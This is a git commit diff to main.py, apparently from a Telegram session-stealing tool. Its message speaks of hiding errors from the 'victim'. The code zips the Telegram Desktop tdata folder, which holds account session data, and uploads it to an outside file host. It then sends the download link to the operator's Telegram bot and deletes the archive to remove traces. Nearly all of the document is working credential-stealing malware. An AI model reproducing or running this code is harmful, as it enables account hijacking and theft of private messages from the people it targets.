3155ec0a3f33f5f1ae7620406655d21ef76fe7db
qwerz <kverzik@gmail.com>
2024-09-17 21:16:47 +0300

    logging
    errors now logging right into your telegram dm, not on victim's screen

--- main.py
+++ main.py
@@ -4,43 +4,47 @@ import requests
 
 # CONFIGURATION PART
 botapitoken = '' # Enter your bot HTTP token made with @BotFather
-telegramchatid = '' # Enter your telegram chatid (for notifications and files receiving
-
-requests.get(fr'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text=Starting') # Sending connection start log to your Telegram DM
-
-userpath = os.path.expanduser("~")
-excludedirs = [
-    fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\dumps',
-    fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\emoji',
-    fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\tdummy',
-    fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\temp',
-    fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\user_data'
-]
-targetdir = fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata'
-
-zippath = fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata.zip'
-
-def zipdir(dir_path, ziph):
-    for root, dirs, files in os.walk(dir_path):
-        dirs[:] = [d for d in dirs if os.path.join(root, d) not in excludedirs]
-        for file in files:
-            file_path = os.path.join(root, file)
-            try:
-                # Adding files
-                ziph.write(file_path, os.path.relpath(file_path, dir_path))
-            except (OSError, IOError) as e:
-                # Skipping errors
-                print(f'Skipping file {file_path} {e}')
+telegramchatid = '' # Enter your telegram chatid (for notifications and files receiving)
 
 try:
-    with ZipFile.ZipFile(zippath, 'w', ZipFile.ZIP_DEFLATED) as zipf:
-        zipdir(targetdir, zipf)
-except (OSError, IOError) as e:
-    print(f'{e}')
+    userpath = os.path.expanduser("~")
+    requests.get(fr'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text=Hello from {userpath}')  # Sending connection start log to your Telegram DM
 
-# Uploading
-with open(zippath, 'rb') as file:
-    response = requests.post('https://kappa.lol/api/upload', files={'file': file})
+    excludedirs = [
+        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\dumps',
+        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\emoji',
+        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\tdummy',
+        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\temp',
+        fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata\user_data'
+    ]
+    targetdir = fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata'
 
-requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={response.json().get("link")}\n {response.json().get("delete")}') # Files arriving to Telegram DM
-os.remove(zippath) # Removing clues
+    zippath = fr'{userpath}\AppData\Roaming\Telegram Desktop\tdata.zip'
+
+    def zipdir(dir_path, ziph):
+        for root, dirs, files in os.walk(dir_path):
+            dirs[:] = [d for d in dirs if os.path.join(root, d) not in excludedirs]
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    # Adding files
+                    ziph.write(file_path, os.path.relpath(file_path, dir_path))
+                except Exception as e:
+                    # Skipping errors
+                    requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={file_path} {e}')
+
+    try:
+        with ZipFile.ZipFile(zippath, 'w', ZipFile.ZIP_DEFLATED) as zipf:
+            zipdir(targetdir, zipf)
+    except Exception as e:
+        requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={e}')
+
+    # Uploading
+    with open(zippath, 'rb') as file:
+        response = requests.post('https://kappa.lol/api/upload', files={'file': file})
+
+    requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={response.json().get("link")}\n{response.json().get("delete")}')  # Files arriving to Telegram DM
+    os.remove(zippath)  # Removing clues
+
+except Exception as e:
+    requests.get(f'https://api.telegram.org/bot{botapitoken}/sendMessage?chat_id={telegramchatid}&text={e}')
